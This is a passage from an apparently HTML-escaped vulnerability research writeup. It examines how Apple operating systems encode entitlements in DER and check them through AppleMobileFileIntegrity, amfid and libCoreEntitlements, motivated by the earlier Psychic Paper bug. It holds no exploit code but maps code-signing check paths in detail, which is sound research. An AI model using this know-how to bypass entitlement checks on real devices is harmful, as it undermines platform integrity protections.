wUhACgDjbS-c24\"&gt;16&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;]&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp;INTEGER &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;01&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp;cont &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;[&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;16&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;]&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp; SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp;UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;application&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;identifier&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp;UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;SKMME9E2Y8&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;com&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;example&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;apple&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;samplecode&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c8\"&gt;ProfileExplainer&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp; SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp;UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;com&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;apple&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;developer&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;team&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;identifier&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp;UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;SKMME9E2Y8&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp; SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp;UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c17\"&gt;get&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;task&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;allow&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp;BOOLEAN &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c24\"&gt;255&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp; SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp;UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;keychain&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;access&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;-&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;groups&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c11 wUhACgDjbS-c5\"&gt;&amp;nbsp; &amp;nbsp;SEQUENCE &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp; UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;SKMME9E2Y8&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c10\"&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;&amp;nbsp; &amp;nbsp; UTF8STRING &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;:&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;com&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;apple&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c0\"&gt;.&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c5 wUhACgDjbS-c13\"&gt;token&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Each individual entitlement is a sequence which has two elements: a key and a value, e.g. &amp;ldquo;get-task-allow&amp;rdquo;:boolean(true). All entitlements are also a part of a constructed type (denoted as &amp;ldquo;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;cont [ 16 ]&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;rdquo; in the listing).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;DER is meant to have unique binary representation and replacing XML with DER was very likely motivated, at least in part, by preventing issues such as Psychic Paper. But does it necessarily succeed in that goal?&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"wUhACgDjbS-c9\" id=\"h.xx7qiyjgj2wn\"&gt;&lt;span&gt;How entitlements are checked&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;To understand how entitlements are checked, it is useful to also look at the bigger picture and understand what security/integrity checks Apple operating systems perform on binaries before (and in some cases, while) running them.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Integrity information in Apple binaries is stored in a structure called the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://github.com/apple-oss-distributions/Security/blob/e4ea024c9bbd3bfda30ec6df270bfb4c7438d1a9/OSX/libsecurity_codesigning/lib/sigblob.h#L43\"&gt;Embedded Signature Blob&lt;/a&gt;&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;. This structure is a container for various other structures that play a role in integrity checking: The digital signature itself, but also entitlements and an important structure called the Code Directory. The Code Directory contains a hash of every page in the binary (up to the Signature Blob), but also other information, including the hash of the entitlements blob. The hash of the CodeDirectory is called cdHash and it is used to uniquely identify the binary. For example, it is cdHash that the digital signature actually signs. Since Code Directory contains a hash of the entitlements blob, note that any change to entitlements will lead to cdHash being different.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;As also noted in the Psychic Paper writeup, there are several ways a binary might be signed:&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_o4b5kflpgafe-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;The cdHash of the binary could be in the system&amp;rsquo;s Trust Cache, which stores the hashes of system binaries.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;The binary could be signed by the Apple App Store.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;The binary could be signed by the developer, but in that case it must reference a &amp;ldquo;Provisioning Profile&amp;rdquo; signed by Apple.&lt;/span&gt;&lt;/li&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;On macOS only, a binary could also be self-signed.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c2\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;We are mostly interested in the last two cases, because they are the only ones that allow us to provide custom entitlements. However, in those cases, any entitlements a binary has must either be a subset of those allowed by the provisioning profile created by Apple (in the &amp;ldquo;provisioning profile&amp;rdquo; case) or entitlements must only contain those whitelisted by the OS (in the self-signed case). That is, unless one has a vulnerability like Psychic Paper.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;An entrypoint into file integrity checks is the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;vnode_check_signature&lt;/span&gt;&lt;span&gt;&amp;nbsp;function inside the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;AppleMobileFileIntegrity&lt;/span&gt;&lt;span&gt;&amp;nbsp;kernel extension. &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;AppleMobileFileIntegrity&lt;/span&gt;&lt;span&gt;&amp;nbsp;is the kernel component of integrity checking, but there is also the userspace demon: &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span&gt;&amp;nbsp;which &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;AppleMobileFileIntegrity&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;uses to perform certain actions as noted further in the text.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;We are not going to analyze the full behavior of &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;vnode_check_signature&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;. However, I will highlight the most important actions and those relevant to understanding DER entitlements workflow:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_mk2jd2ji027g-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;First, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;vnode_check_signature &lt;/span&gt;&lt;span&gt;retrieves the entitlements in the DER format. If the currently loaded binary does not contain DER entitlements and only contains entitlements in the XML format, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;AppleMobileFileIntegrity &lt;/span&gt;&lt;span&gt;calls &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;transmuteEntitlementsInDaemon&lt;/span&gt;&lt;span&gt;&amp;nbsp;which uses &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span&gt;&amp;nbsp;to convert entitlements from XML into DER format. The conversion itself is done via &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CFPropertyListCreateWithData&lt;/span&gt;&lt;span&gt;&amp;nbsp;(to convert XML to CFDictionary) and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESerializeCFDictionary&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;(which converts CFDictionary to DER representation).&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c2\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_mk2jd2ji027g-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;Checks on the signature are performed using the CoreTrust library by calling &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CTEvaluateAMFICodeSignatureCMS&lt;/span&gt;&lt;span&gt;. This process has recently been documented in &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://worthdoingbadly.com/coretrust/\"&gt;another vulnerability writeup&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and will not be examined in detail as it does not relate to entitlements directly&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_mk2jd2ji027g-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;Additional checks on the signature and entitlements are performed in &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span&gt;&amp;nbsp;via the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;verify_code_directory&lt;/span&gt;&lt;span&gt;&amp;nbsp;function. This call will be analyzed in-depth later. One interesting detail about this interaction is that &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span&gt;&amp;nbsp;receives the path to the executable as a parameter. In order to prevent race conditions where the file was changed between being loaded by kernel and checked by &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;returns the cdHash of the checked file. It is then verified that this cdHash matches the cdHash of the file in the kernel.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_mk2jd2ji027g-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;Provisioning profile information is retrieved and it is checked that the entitlements in the binary are a subset of the entitlements in the provisioning profile. This is done with the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextIsSubset&lt;/span&gt;&lt;span&gt;&amp;nbsp;function. This step does not appear to be present on macOS running on Intel CPUs, however even in that case, the entitlements are still checked in &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;as will be shown below.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;verify_code_directory&lt;/span&gt;&lt;span&gt;&amp;nbsp;function of &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;performs (among other things) the following actions:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_n26z3gtxgors-0 start\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;Parses the binary and extracts all the relevant information for integrity checking. The code that does that is part of the open-source &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://github.com/apple-oss-distributions/Security\"&gt;Security&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;library and the two most relevant classes here are &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://github.com/apple-oss-distributions/Security/blob/e4ea024c9bbd3bfda30ec6df270bfb4c7438d1a9/OSX/libsecurity_codesigning/lib/StaticCode.cpp\"&gt;StaticCode&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c15\"&gt;&lt;a class=\"wUhACgDjbS-c181\" href=\"https://github.com/apple-oss-distributions/Security/blob/e4ea024c9bbd3bfda30ec6df270bfb4c7438d1a9/OSX/libsecurity_codesigning/lib/SecStaticCode.cpp\"&gt;SecStaticCode&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. This code is also responsible for extracting the DER-encoded entitlements. Once again, if only XML-encoded entitlements are present, they get converted to DER format. This is, once again, done by the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CFPropertyListCreateWithData&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CESerializeCFDictionary&lt;/span&gt;&lt;span&gt;&amp;nbsp;pair of functions. Additionally, for later use, entitlements are also converted to CFDictionary representation. This conversion from DER to CFDictionary is done using the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEManagedContextFromCFData&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEQueryContextToCFDictionary&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;function pair.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c2\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_n26z3gtxgors-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;Checks that the signature signs the correct cdHash and checks the signature itself. The checking of the digital signature certificate chain isn&amp;rsquo;t actually done by the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span&gt;&amp;nbsp;process. &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;call&lt;/span&gt;&lt;span&gt;s into &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;trustd&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;for that.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=\"padding: 0;\" class=\"c25 lst-kix_n26z3gtxgors-0\"&gt;&lt;li style=\"margin-left: 46pt;\" class=\"c1 c19 li-bullet-0\"&gt;&lt;span&gt;On macOS, the entitlements contained in the binary are filtered into restricted and unrestricted ones. On macOS, the unrestricted entitlements are &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;com.apple.application-identifier&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;com.apple.security.application-groups*&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;com.apple.private.signing-identifier&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;com.apple.security.*&lt;/span&gt;&lt;span&gt;. If the binary contains &lt;/span&gt;&lt;span&gt;any entitlements&lt;/span&gt;&lt;span&gt;&amp;nbsp;not listed above, it needs to be checked against a provisioning profile. The check here relies on the entitlements CFDictionary, extracted earlier in &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;amfid&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;Later, when the binary runs, if the operating system wants to check that the binary contains an entitlement to perform a specific action, it can do this in several ways. The &amp;ldquo;old way&amp;rdquo; of doing this is to retrieve a dictionary representation of entitlements and query a dictionary for a specific key. However, there is also a new API for querying entitlements, where the caller first creates a &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEQuery&lt;/span&gt;&lt;span&gt;&amp;nbsp;object containing the entitlement key they want to query (and, optionally, the expected value) and then performs the query by calling &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span&gt;&amp;nbsp;function with the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEQuery&lt;/span&gt;&lt;span&gt;&amp;nbsp;object as a parameter. For example, the &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;IOTaskHasEntitlement&lt;/span&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&amp;nbsp;function, which takes an entitlement name and returns bool relies on the latter API.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"wUhACgDjbS-c9\" id=\"h.a9n48gmjlgpm\"&gt;&lt;span&gt;libCoreEntitlements&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"wUhACgDjbS-c1\"&gt;&lt;span&gt;You might have noticed that a lot of functions for interacting with DER entitlements start with the letters &amp;ldquo;CE&amp;rdquo;, such as &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEQueryContextToCFDictionary&lt;/span&gt;&lt;span&gt;&amp;nbsp;or &lt;/span&gt;&lt;span class=\"wUhACgDjbS-c4\"&gt;CEContextQuery&lt;/span&gt;&lt;span&gt;. Here, CE stands for libCoreEntitlements, which is a new library created specifically for DER-encoded entitlements. libCoreEntitlements is present both in the 